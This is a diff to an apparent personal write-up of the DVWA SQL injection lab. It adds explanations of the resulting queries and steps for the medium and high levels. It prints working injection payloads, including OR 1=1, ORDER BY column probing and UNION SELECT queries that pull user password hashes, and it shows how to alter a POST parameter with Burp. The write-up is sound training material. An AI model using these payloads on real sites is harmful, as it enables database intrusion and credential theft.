@@ -37,7 +37,7 @@ A SQL injection (SQLi) attack consists of insertion or "injection" of a SQL quer
 
 ## PHP required configurations
 
-Before start working on this lab, we must ensure that the `display_errors` PHP configuration is `On`. If not we won't be able to get any error messages back which will make the lab much harder.
+Before start working on this lab, we must ensure that the `display_errors` PHP configuration is `On`. If not, we won't be able to get any error messages back which will make the lab much harder.
 
 1. Go to PHP Info and check the value of `display_errors` variable:
 
@@ -95,8 +95,14 @@ Before start working on this lab, we must ensure that the `display_errors` PHP c
 
     ![](single_quote.png)
 
+    This translates to:
+    ```sql
+    SELECT first_name, last_name 
+    FROM users 
+    WHERE user_id = '';
+    ```
 
-3. We can try the "[Always True Scenario](https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson6/index.html)": if we input something that does not exist, such as `%'`, and follow that by something that is always `TRUE`, such as `'1'='1`, we will get everything back. We are essentially saying "_display all records that are `FALSE` and all records that are `TRUE`_":
+3. We can try the "[Always True Scenario](https://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson6/index.html)": if we input something that it is always `TRUE`, such as `1=1`, we will get everything back:
 
     ![](sqli_users.png)
 
@@ -104,27 +110,56 @@ Before start working on this lab, we must ensure that the `display_errors` PHP c
     ```sql
     SELECT first_name, last_name 
     FROM users 
-    WHERE user_id = '6' 
-    OR '1'='1'
+    WHERE user_id = '1' 
+    OR 1=1
     ```
 
-3. So we have the `First name` and `Surname` fields of all 5 users. We need to first find out if more fields are available in the database. According to [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks) one way of doing that is by performing a **UNION attack** and the use of `ORDER BY` clause:
+3. So we have the `First name` and `Surname` fields of all 5 users. We need to first find out if more fields are available in the database. According to [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks) one way of doing that is by performing a **UNION attack** combined with `ORDER BY` clause. This works because the value after the `ORDER BY` clause incidates the column index, thus, if we try to order our table with the value of, for instance, `5`, while the table has only `4` columns, we will get back an "*unknown column*" error: 
 
-    > Notice that we are using [MariaDB](https://mariadb.com/kb/en/comment-syntax/), so we need to end our payload either with `#` or `-- `.
+    > Notice that we are using [MariaDB](https://mariadb.com/kb/en/comment-syntax/), so we need to end our payload either with `#` or `-- ` (notice the **space** after the double dash).
 
     If we inject `' ORDER BY 1-- ` we get nothing back, so we increment the number until we get an error:
 
     ![](order_by_3.png)
 
-4. We got the error on `3`, so this confirms that there are only 2 fields in that table. We can try guessing those fields, for instance, inputting `' UNION SELECT username, password FROM users#`:
+    This translates to: 
+    ```sql
+    SELECT first_name, last_name 
+    FROM users 
+    WHERE user_id = '' 
+    ORDER BY 1
+    ```
+
+
+4. We got the error on `3`, so this confirms that there are only 2 columns in that table. We can try guessing those fields, for instance, inputting `' UNION SELECT username, password FROM users#`:
 
     ![](username_error.png)
+
+    This translates to: 
+    ```sql
+    SELECT first_name, last_name 
+    FROM users 
+    WHERE user_id = '' 
+    UNION
+    SELECT username, password
+    FROM users
+    ```
 
 5. The field `username` does not exist, so we could try changing that to something similar, such as `' UNION SELECT user, password FROM users#`:
 
     ![](user_success.png)
 
-6. The database gaves the passwords in hash format instead of plaintext. We can find the hash type as follows:
+    This translates to: 
+    ```sql
+    SELECT first_name, last_name 
+    FROM users 
+    WHERE user_id = '' 
+    UNION
+    SELECT user, password
+    FROM users
+    ```
+
+6. We managed to get the hashed passwords. We can find the hash type as follows:
 
     ```shell
     # check the hash type
@@ -191,11 +226,28 @@ Before start working on this lab, we must ensure that the `display_errors` PHP c
 ## Security: Medium
 > _The medium level uses a form of SQL injection protection, with the function of [`mysql_real_escape_string()`](https://www.php.net/manual/en/function.mysql-real-escape-string.php). However due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered. The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli/sqli_medium_source_code.php))._
 
+1. Since the text box haas been replaced with a dropdown list and uses POST to submit the form, we can't pefrom an SQLi attack directly on the browser (that's a lie, see step 3!). So let's intercept the traffic with Burp:
+
+    ![](medium_burp_1.png)
+
+2. We can manipulate the parameter `id` and execute the same commands as before:
+
+    ![](medium_burp_all_users.png)
+
+    ![](medium_passes.png)
+
+3. We can also perform the SQLi attack via the inspect function. Right-click the dropdown list > *Inspect (Q)*:
+
+    ![](inspect_element.png)
+
+    ![](inspect_sqli.png)
 
 ## Security: High
 > _This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli/sqli_high_source_code.php))._
 
+1. Now the input method has changed, but nothing else really; we can just perform our SQLi attack in the new pop up window:
 
+    ![](high_popup.png)
 
 ## Security: Impossible
 > _The queries are now parameterized queries (rather than being dynamic). This means the query has been defined by the developer, and has distinguish which sections are code, and the rest is data ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/sqli/sqli_impossible_source_code.php))._
